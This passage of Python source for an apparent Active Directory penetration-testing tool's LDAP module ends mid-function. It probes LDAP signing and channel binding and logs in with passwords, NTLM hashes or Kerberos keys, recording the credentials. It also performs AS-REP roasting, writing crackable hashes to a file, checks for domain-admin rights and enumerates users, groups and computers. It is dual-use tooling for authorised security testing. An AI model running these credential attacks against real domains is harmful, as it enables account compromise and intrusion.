# from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
# https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf
import hashlib
import hmac
import os
from errno import EHOSTUNREACH, ETIMEDOUT, ENETUNREACH
from binascii import hexlify
from datetime import datetime
from re import sub, IGNORECASE
from zipfile import ZipFile
from termcolor import colored
from dns import resolver

from Cryptodome.Hash import MD4
from OpenSSL.SSL import SysCallError
from bloodhound.ad.authentication import ADAuthentication
from bloodhound.ad.domain import AD
from impacket.dcerpc.v5.samr import (
    UF_ACCOUNTDISABLE,
    UF_DONT_REQUIRE_PREAUTH,
    UF_TRUSTED_FOR_DELEGATION,
    UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,
    UF_SERVER_TRUST_ACCOUNT,
    SAM_MACHINE_ACCOUNT,
)
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGS, SessionKeyDecryptionError
from impacket.krb5.ccache import CCache
from impacket.krb5.types import Principal, KerberosException
from impacket.ldap import ldap as ldap_impacket
from impacket.ldap import ldaptypes
from impacket.ldap import ldapasn1 as ldapasn1_impacket
from impacket.ldap.ldap import LDAPFilterSyntaxError
from impacket.smbconnection import SessionError
from impacket.ntlm import getNTLMSSPType1

from nxc.config import process_secret, host_info_colors
from nxc.connection import connection
from nxc.helpers.bloodhound import add_user_bh
from nxc.logger import NXCAdapter, nxc_logger
from nxc.protocols.ldap.bloodhound import BloodHound
from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
from nxc.protocols.ldap.kerberos import KerberosAttacks
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.helpers.ntlm_parser import parse_challenge
from nxc.helpers.misc import get_bloodhound_info

ldap_error_status = {
    "1": "STATUS_NOT_SUPPORTED",
    "533": "STATUS_ACCOUNT_DISABLED",
    "701": "STATUS_ACCOUNT_EXPIRED",
    "531": "STATUS_ACCOUNT_RESTRICTION",
    "530": "STATUS_INVALID_LOGON_HOURS",
    "532": "STATUS_PASSWORD_EXPIRED",
    "773": "STATUS_PASSWORD_MUST_CHANGE",
    "775": "USER_ACCOUNT_LOCKED",
    "50": "LDAP_INSUFFICIENT_ACCESS",
    "0": "LDAP Signing IS Enforced",
    "KDC_ERR_CLIENT_REVOKED": "KDC_ERR_CLIENT_REVOKED",
    "KDC_ERR_PREAUTH_FAILED": "KDC_ERR_PREAUTH_FAILED",
}


def resolve_collection_methods(methods):
    """Convert methods (string) to list of validated methods to resolve"""
    valid_methods = [
        "group",
        "localadmin",
        "session",
        "trusts",
        "default",
        "all",
        "loggedon",
        "objectprops",
        "experimental",
        "acl",
        "dcom",
        "rdp",
        "psremote",
        "dconly",
        "container",
    ]
    default_methods = ["group", "localadmin", "session", "trusts"]
    # Similar to SharpHound, All is not really all, it excludes loggedon
    all_methods = [
        "group",
        "localadmin",
        "session",
        "trusts",
        "objectprops",
        "acl",
        "dcom",
        "rdp",
        "psremote",
        "container",
    ]
    # DC only, does not collect to computers
    dconly_methods = ["group", "trusts", "objectprops", "acl", "container"]
    if "," in methods:
        method_list = [method.lower() for method in methods.split(",")]
        validated_methods = []
        for method in method_list:
            if method not in valid_methods:
                nxc_logger.error("Invalid collection method specified: %s", method)
                return False

            if method == "default":
                validated_methods += default_methods
            elif method == "all":
                validated_methods += all_methods
            elif method == "dconly":
                validated_methods += dconly_methods
            else:
                validated_methods.append(method)
        return set(validated_methods)
    else:
        validated_methods = []
        # It is only one
        method = methods.lower()
        if method in valid_methods:
            if method == "default":
                validated_methods += default_methods
            elif method == "all":
                validated_methods += all_methods
            elif method == "dconly":
                validated_methods += dconly_methods
            else:
                validated_methods.append(method)
            return set(validated_methods)
        else:
            nxc_logger.error("Invalid collection method specified: %s", method)
            return False


class ldap(connection):
    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.os_arch = 0
        self.hash = None
        self.ldap_connection = None
        self.lmhash = ""
        self.nthash = ""
        self.baseDN = ""
        self.target = ""
        self.targetDomain = ""
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smbv1 = None
        self.signing = False
        self.signing_required = None
        self.cbt_status = None
        self.admin_privs = False
        self.no_ntlm = False
        self.sid_domain = ""
        self.scope = None

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = NXCAdapter(
            extra={
                "protocol": "LDAP",
                "host": self.host,
                "port": self.port,
                "hostname": self.hostname,
            }
        )

    def create_conn_obj(self):
        target = ""
        target_domain = ""
        base_dn = ""
        try:
            proto = "ldaps" if self.port == 636 else "ldap"
            ldap_url = f"{proto}://{self.host}"
            self.logger.info(f"Connecting to {ldap_url} with no baseDN")
            try:
                self.ldap_connection = ldap_impacket.LDAPConnection(ldap_url, dstIp=self.host)
                if self.ldap_connection:
                    self.logger.debug(f"ldap_connection: {self.ldap_connection}")
            except SysCallError as e:
                if proto == "ldaps":
                    self.logger.fail(f"LDAPs connection to {ldap_url} failed - {e}")
                    # https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-ldap-over-ssl-3rd-certification-authority
                    self.logger.fail("Even if the port is open, LDAPS may not be configured")
                else:
                    self.logger.fail(f"LDAP connection to {ldap_url} failed: {e}")
                return False

            resp = self.ldap_connection.search(
                scope=ldapasn1_impacket.Scope("baseObject"),
                attributes=["defaultNamingContext", "dnsHostName"],
                sizeLimit=0,
            )
            resp_parsed = parse_result_attributes(resp)[0]

            target = resp_parsed["dnsHostName"]
            base_dn = resp_parsed["defaultNamingContext"]
            target_domain = sub(
                r",DC=",
                ".",
                base_dn[base_dn.lower().find("dc="):],
                flags=IGNORECASE,
            )[3:]
        except ConnectionRefusedError as e:
            self.logger.debug(f"{e} on host {self.host}")
            return False
        except OSError as e:
            if e.errno in (EHOSTUNREACH, ENETUNREACH, ETIMEDOUT):
                self.logger.info(f"Error connecting to {self.host} - {e}")
                return False
            else:
                self.logger.error(f"Error getting ldap info {e}")

        self.logger.debug(f"Target: {target}; target_domain: {target_domain}; base_dn: {base_dn}")
        self.target = target
        self.targetDomain = target_domain
        self.baseDN = base_dn
        return True

    def get_ldap_username(self):
        extended_request = ldapasn1_impacket.ExtendedRequest()
        extended_request["requestName"] = "1.3.6.1.4.1.4203.1.11.3"  # whoami

        response = self.ldap_connection.sendReceive(extended_request)
        for message in response:
            search_result = message["protocolOp"].getComponent()
            if search_result["resultCode"] == ldapasn1_impacket.ResultCode("success"):
                response_value = search_result["responseValue"]
                if response_value.hasValue():
                    value = response_value.asOctets().decode(response_value.encoding)[2:]
                    return value.split("\\")[1]
        return ""

    def check_ldap_signing(self):
        self.signing_required = False
        ldap_url = f"ldap://{self.target}"
        try:
            ldap_connection = ldap_impacket.LDAPConnection(url=ldap_url, baseDN=self.baseDN, dstIp=self.host, signing=False)
            ldap_connection.login(domain=self.domain)
            self.logger.debug(f"LDAP signing is not enforced on {self.host}")
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                self.logger.debug(f"LDAP signing is enforced on {self.host}")
                self.signing_required = True
            else:
                self.logger.debug(f"LDAPSessionError while checking for signing requirements (likely NTLM disabled): {e!s}")

    def check_ldaps_cbt(self):
        self.cbt_status = "Never"
        ldap_url = f"ldaps://{self.target}"
        try:
            ldap_connection = ldap_impacket.LDAPConnection(url=ldap_url, baseDN=self.baseDN, dstIp=self.host)
            ldap_connection._LDAPConnection__channel_binding_value = None
            ldap_connection.login(user=" ", domain=self.domain)
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("data 80090346") >= 0:
                self.logger.debug(f"LDAPS channel binding enforced on host {self.host}")
                self.cbt_status = "Always"  # CBT is Required
            # Login failed (wrong credentials). test if we get an error with an existing, but wrong CBT -> When supported
            elif str(e).find("data 52e") >= 0:
                ldap_connection = ldap_impacket.LDAPConnection(url=ldap_url, baseDN=self.baseDN, dstIp=self.host)
                new_cbv = bytearray(ldap_connection._LDAPConnection__channel_binding_value)
                new_cbv[15] = (new_cbv[3] + 1) % 256
                ldap_connection._LDAPConnection__channel_binding_value = bytes(new_cbv)
                try:
                    ldap_connection.login(user=" ", domain=self.domain)
                except ldap_impacket.LDAPSessionError as e:
                    if str(e).find("data 80090346") >= 0:
                        self.logger.debug(f"LDAPS channel binding is set to 'When Supported' on host {self.host}")
                        self.cbt_status = "When Supported"  # CBT is When Supported
            else:
                self.logger.debug(f"LDAPSessionError while checking for channel binding requirements (likely NTLM disabled): {e!s}")
        except SysCallError as e:
            self.logger.debug(f"Received SysCallError when trying to enumerate channel binding support: {e!s}")
            if e.args[1] == "ECONNRESET":
                self.cbt_status = "No TLS cert"
            else:
                raise

    def enum_host_info(self):
        self.hostname = self.target.split(".")[0].upper() if "." in self.target else self.target
        self.remoteName = self.target

        ntlm_challenge = None
        bindRequest = ldapasn1_impacket.BindRequest()
        bindRequest["version"] = 3
        bindRequest["name"] = ""
        negotiate = getNTLMSSPType1()
        bindRequest["authentication"]["sicilyNegotiate"] = negotiate.getData()
        try:
            response = self.ldap_connection.sendReceive(bindRequest)[0]["protocolOp"]
            ntlm_challenge = bytes(response["bindResponse"]["matchedDN"])
        except Exception as e:
            self.logger.debug(f"Failed to get target {self.host} ntlm challenge, error: {e!s}")

        if ntlm_challenge:
            ntlm_info = parse_challenge(ntlm_challenge)
            self.server_os = ntlm_info["os_version"]
        else:
            self.no_ntlm = True

        if self.args.domain:
            self.domain = self.args.domain
        elif self.args.use_kcache:  # Fixing domain trust, just pull the auth domain out of the ticket
            self.domain = CCache.parseFile()[0]
            self.username = CCache.parseFile()[1]
        else:
            self.domain = self.targetDomain

        self.check_ldap_signing()
        self.check_ldaps_cbt()

        # using kdcHost is buggy on impacket when using trust relation between ad so we kdcHost must stay to none if targetdomain is not equal to domain
        if not self.kdcHost and self.domain and self.domain == self.targetDomain:
            result = self.resolver(self.domain)
            self.kdcHost = result["host"] if result else None
            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")

        self.output_filename = os.path.expanduser(f"~/.nxc/logs/{self.hostname}_{self.host}".replace(":", "-"))

        try:
            self.db.add_host(
                self.host,
                self.hostname,
                self.domain,
                self.server_os
            )
        except Exception as e:
            self.logger.debug(f"Error adding host {self.host} into db: {e!s}")

    def print_host_info(self):
        self.logger.debug("Printing host info for LDAP")
        signing = colored("signing:Enforced", host_info_colors[0], attrs=["bold"]) if self.signing_required else colored("signing:None", host_info_colors[1], attrs=["bold"])
        cbt_status = colored(f"channel binding:{self.cbt_status}", host_info_colors[3], attrs=["bold"]) if self.cbt_status == "Always" else colored(f"channel binding:{self.cbt_status}", host_info_colors[2], attrs=["bold"])
        ntlm = colored(f"(NTLM:{not self.no_ntlm})", host_info_colors[2], attrs=["bold"]) if self.no_ntlm else ""

        self.logger.extra["protocol"] = "LDAP" if str(self.port) == "389" else "LDAPS"
        self.logger.extra["port"] = self.port
        self.logger.extra["hostname"] = self.hostname
        self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.domain}) ({signing}) ({cbt_status}) {ntlm}")

    def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
        self.username = username if not self.username else self.username    # With ccache we get the username from the ticket
        self.password = password
        self.domain = domain
        self.kdcHost = kdcHost
        self.aesKey = aesKey

        lmhash = ""
        nthash = ""

        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(":") != -1:
            lmhash, nthash = ntlm_hash.split(":")
            self.hash = nthash
        else:
            nthash = ntlm_hash
            self.hash = ntlm_hash
        if lmhash:
            self.lmhash = lmhash
        if nthash:
            self.nthash = nthash

        if self.username and self.password == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(f"{hash_tgt}\n")
            return False

        kerb_pass = next(s for s in [self.nthash, password, aesKey] if s) if not all(s == "" for s in [self.nthash, password, aesKey]) else ""

        try:
            # Connect to LDAP
            self.logger.extra["protocol"] = "LDAPS" if self.port == 636 else "LDAP"
            self.logger.extra["port"] = "636" if self.port == 636 else "389"
            proto = "ldaps" if self.port == 636 else "ldap"
            ldap_url = f"{proto}://{self.target}"
            self.logger.info(f"Connecting to {ldap_url} - {self.baseDN} - {self.host} [1]")
            self.ldap_connection = ldap_impacket.LDAPConnection(url=ldap_url, baseDN=self.baseDN, dstIp=self.host)
            self.ldap_connection.kerberosLogin(username, password, domain, self.lmhash, self.nthash, aesKey, kdcHost=kdcHost, useCache=useCache)
            if self.username == "":
                self.username = self.get_ldap_username()

            self.check_if_admin()

            if password:
                self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
                self.db.add_credential("plaintext", domain, self.username, self.password)
            elif ntlm_hash:
                self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.hash}")
                self.db.add_credential("hash", domain, self.username, self.hash)

            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            self.logger.success(f"{domain}\\{self.username}{used_ccache} {self.mark_pwned()}")

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
            return True
        except SessionKeyDecryptionError:
            # for PRE-AUTH account
            self.logger.success(
                f"{domain}\\{self.username}{' account vulnerable to asreproast attack'} {''}",
                color="yellow",
            )
            return False
        except SessionError as e:
            error, desc = e.getErrorString()
            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            self.logger.fail(
                f"{self.domain}\\{self.username}{used_ccache} {error!s}",
                color="magenta" if error in ldap_error_status else "red",
            )
            return False
        except (KeyError, KerberosException, OSError) as e:
            self.logger.fail(
                f"{self.domain}\\{self.username}{' from ccache' if useCache else f':{process_secret(kerb_pass)}'} {e!s}",
                color="red",
            )
            return False
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                # We need to try SSL
                try:
                    # Connect to LDAPS
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    self.port = 636
                    ldaps_url = f"ldaps://{self.target}"
                    self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} - {self.host} [2]")
                    self.ldap_connection = ldap_impacket.LDAPConnection(url=ldaps_url, baseDN=self.baseDN, dstIp=self.host)
                    self.ldap_connection.kerberosLogin(username, password, domain, self.lmhash, self.nthash, aesKey, kdcHost=kdcHost, useCache=useCache)
                    if self.username == "":
                        self.username = self.get_ldap_username()

                    self.check_if_admin()

                    if password:
                        self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
                        self.db.add_credential("plaintext", domain, self.username, self.password)
                    elif ntlm_hash:
                        self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.hash}")
                        self.db.add_credential("hash", domain, self.username, self.hash)

                    # Prepare success credential text
                    self.logger.success(f"{domain}\\{self.username} {self.mark_pwned()}")

                    if not self.args.local_auth and self.username != "":
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if self.admin_privs:
                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                    return True
                except SessionError as e:
                    error, desc = e.getErrorString()
                    self.logger.fail(
                        f"{self.domain}\\{self.username}{' from ccache' if useCache else f':{process_secret(kerb_pass)}'} {error!s}",
                        color="magenta" if error in ldap_error_status else "red",
                    )
                    return False
                except Exception as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status.get(error_code, '')}",
                        color="magenta" if error_code in ldap_error_status else "red",
                    )
                    return False
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}{' from ccache' if useCache else f':{process_secret(kerb_pass)}'} {error_code!s}",
                    color="magenta" if error_code in ldap_error_status else "red",
                )
                return False

    def plaintext_login(self, domain, username, password):
        self.username = username
        self.password = password
        self.domain = domain

        if self.username and self.password == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(f"{hash_tgt}\n")
            return False

        try:
            # Connect to LDAP
            self.logger.extra["protocol"] = "LDAPS" if self.port == 636 else "LDAP"
            self.logger.extra["port"] = "636" if self.port == 636 else "389"
            proto = "ldaps" if self.port == 636 else "ldap"
            ldap_url = f"{proto}://{self.target}"
            self.logger.info(f"Connecting to {ldap_url} - {self.baseDN} - {self.host} [3]")
            self.ldap_connection = ldap_impacket.LDAPConnection(url=ldap_url, baseDN=self.baseDN, dstIp=self.host)
            self.ldap_connection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            self.check_if_admin()
            self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
            self.db.add_credential("plaintext", domain, self.username, self.password)

            # Prepare success credential text
            self.logger.success(f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
            return True
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                # We need to try SSL
                try:
                    # Connect to LDAPS
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    self.port = 636
                    ldaps_url = f"ldaps://{self.target}"
                    self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} - {self.host} [4]")
                    self.ldap_connection = ldap_impacket.LDAPConnection(url=ldaps_url, baseDN=self.baseDN, dstIp=self.host)
                    self.ldap_connection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
                    self.check_if_admin()
                    self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
                    self.db.add_credential("plaintext", domain, self.username, self.password)

                    # Prepare success credential text
                    self.logger.success(f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")

                    if not self.args.local_auth and self.username != "":
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if self.admin_privs:
                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                    return True
                except Exception as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status.get(error_code, '')}",
                        color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                    )
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status.get(error_code, '')}",
                    color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                )
            return False
        except OSError as e:
            self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {'Error connecting to the domain, are you sure LDAP service is running on the target?'} \nError: {e}")
            return False

    def hash_login(self, domain, username, ntlm_hash):
        self.logger.extra["protocol"] = "LDAP"
        self.logger.extra["port"] = "389"
        lmhash = ""
        nthash = ""

        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(":") != -1:
            lmhash, nthash = ntlm_hash.split(":")
        else:
            nthash = ntlm_hash

        self.hash = ntlm_hash
        if lmhash:
            self.lmhash = lmhash
        if nthash:
            self.nthash = nthash

        self.username = username
        self.domain = domain

        if self.username and self.hash == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(f"{hash_tgt}\n")
            return False

        try:
            # Connect to LDAP
            self.logger.extra["protocol"] = "LDAPS" if self.port == 636 else "LDAP"
            self.logger.extra["port"] = "636" if self.port == 636 else "389"
            proto = "ldaps" if self.port == 636 else "ldap"
            ldaps_url = f"{proto}://{self.target}"
            self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} - {self.host}")
            self.ldap_connection = ldap_impacket.LDAPConnection(url=ldaps_url, baseDN=self.baseDN, dstIp=self.host)
            self.ldap_connection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            self.check_if_admin()
            self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.hash}")
            self.db.add_credential("hash", domain, self.username, self.hash)

            # Prepare success credential text
            out = f"{domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
            return True
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                try:
                    # We need to try SSL
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    self.port = 636
                    ldaps_url = f"ldaps://{self.target}"
                    self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} - {self.host}")
                    self.ldap_connection = ldap_impacket.LDAPConnection(url=ldaps_url, baseDN=self.baseDN, dstIp=self.host)
                    self.ldap_connection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
                    self.check_if_admin()
                    self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.hash}")
                    self.db.add_credential("hash", domain, self.username, self.hash)

                    # Prepare success credential text
                    out = f"{domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}"
                    self.logger.success(out)

                    if not self.args.local_auth and self.username != "":
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if self.admin_privs:
                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                    return True
                except ldap_impacket.LDAPSessionError as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{process_secret(nthash)} {ldap_error_status.get(error_code, '')}",
                        color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                    )
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{process_secret(nthash)} {ldap_error_status.get(error_code, '')}",
                    color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                )
            return False
        except OSError as e:
            self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {'Error connecting to the domain, are you sure LDAP service is running on the target?'} \nError: {e}")
            return False

    def get_sid(self):
        self.logger.highlight(f"Domain SID {self.sid_domain}")

    def check_if_admin(self):
        # 1. get SID of the domaine
        search_filter = "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
        attributes = ["objectSid"]
        resp = self.search(search_filter, attributes, sizeLimit=0, baseDN=self.baseDN)
        resp_parsed = parse_result_attributes(resp)
        answers = []
        if resp and (self.password != "" or self.lmhash != "" or self.nthash != "" or self.aesKey != "") and self.username != "":
            for item in resp_parsed:
                self.sid_domain = "-".join(item["objectSid"].split("-")[:-1])

            # 2. get all group cn name
            search_filter = f"(|(objectSid={self.sid_domain}-512)(objectSid={self.sid_domain}-544)(objectSid={self.sid_domain}-519)(objectSid=S-1-5-32-549)(objectSid=S-1-5-32-551))"
            attributes = ["distinguishedName"]
            resp = self.search(search_filter, attributes, sizeLimit=0, baseDN=self.baseDN)
            resp_parsed = parse_result_attributes(resp)
            answers = []
            for item in resp_parsed:
                answers.append(f"(memberOf:1.2.840.113556.1.4.1941:={item['distinguishedName']})")
            if len(answers) == 0:
                self.logger.debug("No groups with default privileged RID were found. Assuming user is not a Domain Administrator.")
                return

            # 3. get member of these groups
            search_filter = f"(&(objectCategory=user)(sAMAccountName={self.username})(|{''.join(answers)}))"
            resp = self.search(search_filter, attributes=[], sizeLimit=0, baseDN=self.baseDN)
            resp_parsed = parse_result_attributes(resp)
            for item in resp_parsed:
                if item:
                    self.admin_privs = True

    def getUnixTime(self, t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def search(self, searchFilter, attributes, sizeLimit=0, baseDN=None) -> list:
        if baseDN is None and self.args.base_dn is not None:
            baseDN = self.args.base_dn
        elif baseDN is None:
            baseDN = self.baseDN

        try:
            if self.ldap_connection:
                self.logger.debug(f"Search Filter={searchFilter}")

                # Microsoft Active Directory set an hard limit of 1000 entries returned by any search
                paged_search_control = [ldapasn1_impacket.SimplePagedResultsControl(criticality=True, size=1000)] if not self.no_ntlm else ""
                return self.ldap_connection.search(
                    scope=self.scope,
                    searchBase=baseDN,
                    searchFilter=searchFilter,
                    attributes=attributes,
                    sizeLimit=sizeLimit,
                    searchControls=paged_search_control,
                )
        except ldap_impacket.LDAPSearchError as e:
            if "sizeLimitExceeded" in str(e):
                # We should never reach this code as we use paged search now
                self.logger.fail("sizeLimitExceeded exception caught, giving up and processing the data received")
                e.getAnswers()
            # if empty username and password is possible that we need to change the scope, we try with a baseObject before returning a fail
            elif "operationsError" in str(e) and self.scope is None and self.username == "" and self.password == "":
                self.scope = ldapasn1_impacket.Scope("baseObject")
                return self.search(searchFilter, attributes, sizeLimit, baseDN)
            else:
                self.logger.fail(e)
                return []
        return []

    def users(self):
        """
        Retrieves user information from the LDAP server.

        Args:
        ----
            input_attributes (list): Optional. List of attributes to retrieve for each user.

        Returns:
        -------
            None
        """
        if self.args.users:
            self.logger.debug(f"Dumping users: {', '.join(self.args.users)}")
            search_filter = f"(|{''.join(f'(sAMAccountName={user})' for user in self.args.users)})"
        else:
            self.logger.debug("Trying to dump all users")
            search_filter = "(sAMAccountType=805306368)"

        # Default to these attributes to mirror the SMB --users functionality
        request_attributes = ["sAMAccountName", "description", "badPwdCount", "pwdLastSet"]
        resp = self.search(search_filter, request_attributes, sizeLimit=0)
        users = []

        if resp:
            resp_parsed = parse_result_attributes(resp)

            # We print the total records after we parse the results since often SearchResultReferences are returned
            self.logger.display(f"Enumerated {len(resp_parsed):d} domain users: {self.domain}")
            self.logger.highlight(f"{'-Username-':<30}{'-Last PW Set-':<20}{'-BadPW-':<9}{'-Description-':<60}")
            for user in resp_parsed:
                pwd_last_set = user.get("pwdLastSet", "")
                if pwd_last_set:
                    pwd_last_set = "<never>" if pwd_last_set == "0" else datetime.fromtimestamp(self.getUnixTime(int(pwd_last_set))).strftime("%Y-%m-%d %H:%M:%S")

                # We default attributes to blank strings if they don't exist in the dict
                self.logger.highlight(f"{user.get('sAMAccountName', ''):<30}{pwd_last_set:<20}{user.get('badPwdCount', ''):<9}{user.get('description', ''):<60}")
                users.append(user.get("sAMAccountName", ""))
            if self.args.users_export:
                self.logger.display(f"Writing {len(resp_parsed):d} local users to {self.args.users_export}")
                with open(self.args.users_export, "w+") as file:
                    file.writelines(f"{user}\n" for user in users)

    def users_export(self):
        self.users()

    def groups(self):
        # Building the search filter
        if self.args.groups:
            self.logger.debug(f"Dumping group: {self.args.groups}")
            search_filter = f"(cn={self.args.groups})"
            attributes = ["member"]
        else:
            search_filter = "(objectCategory=group)"
            attributes = ["cn", "member"]
        resp = self.search(search_filter, attributes, 0)
        resp_parsed = parse_result_attributes(resp)
        self.logger.debug(f"Total of records returned {len(resp_parsed)}")

        if self.args.groups:
            if not resp_parsed:
                self.logger.fail(f"Group {self.args.groups} not found")
            elif not resp_parsed[0]:
                self.logger.fail(f"Group {self.args.groups} has no members")
            else:
                # Fix if group has only one member
                if not isinstance(resp_parsed[0]["member"], list):
                    resp_parsed[0]["member"] = [resp_parsed[0]["member"]]
                for user in resp_parsed[0]["member"]:
                    self.logger.highlight(user.split(",")[0].split("=")[1])
        else:
            for item in resp_parsed:
                try:
                    # Fix if group has only one member
                    if not isinstance(item.get("member", []), list):
                        item["member"] = [item["member"]]
                    self.logger.highlight(f"{item['cn']:<40} membercount: {len(item.get('member', []))}")
                except Exception as e:
                    self.logger.debug("Exception:", exc_info=True)
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")

    def computers(self):
        resp = self.search(f"(sAMAccountType={SAM_MACHINE_ACCOUNT})", ["name"], 0)
        resp_parsed = parse_result_attributes(resp)

        if resp:
            self.logger.display(f"Total records returned: {len(resp_parsed)}")
            for item in resp_parsed:
                self.logger.highlight(item["name"] + "$")

    def dc_list(self):
        # Building the search filter
        resolv = resolver.Resolver()
        if self.args.dns_server:
            resolv.nameservers = [self.args.dns_server]
        else:
            resolv.nameservers = [self.host]
        resolv.timeout = self.args.dns_timeout

        # Function to resolve and display hostnames
        def resolve_and_display_hostname(name, domain_name=None):
            prefix = f"[{domain_name}] " if domain_name else ""
            try:
                # Resolve using DNS server for A, AAAA, CNAME, PTR, and NS records
                for record_type in ["A", "AAAA", "CNAME", "PTR", "NS"]:
                    try:
                        answers = resolv.resolve(name, record_type, tcp=self.args.dns_tcp)
                        for rdata in answers:
                            if record_type in ["A", "AAAA"]:
                                ip_address = rdata.to_text()
                                self.logger.highlight(f"{prefix}{name} = {colored(ip_address, host_info_colors[0])}")
                                return
                            elif record_type == "CNAME":
                                self.logger.highlight(f"{prefix}{name} CNAME = {colored(rdata.to_text(), host_info_colors[0])}")
                                return
                            elif record_type == "PTR":
                                self.logger.highlight(f"{prefix}{name} PTR = {colored(rdata.to_text(), host_info_colors[0])}")
                                return
                            elif record_type == "NS":
                                self.logger.highlight(f"{prefix}{name} NS = {colored(rdata.to_text(), host_info_colors[0])}")
                                return
                    except resolver.NXDOMAIN:
                        self.logger.fail(f"{prefix}{name} = Host not found (NXDOMAIN)")
                    except resolver.Timeout:
                        self.logger.fail(f"{prefix}{name} = Connection timed out")
                    except resolver.NoAnswer:
                        self.logger.fail(f"{prefix}{name} = DNS server did not respond")
                    except Exception as e:
                        self.logger.fail(f"{prefix}{name} encountered an unexpected error: {e}")
            except Exception as e:
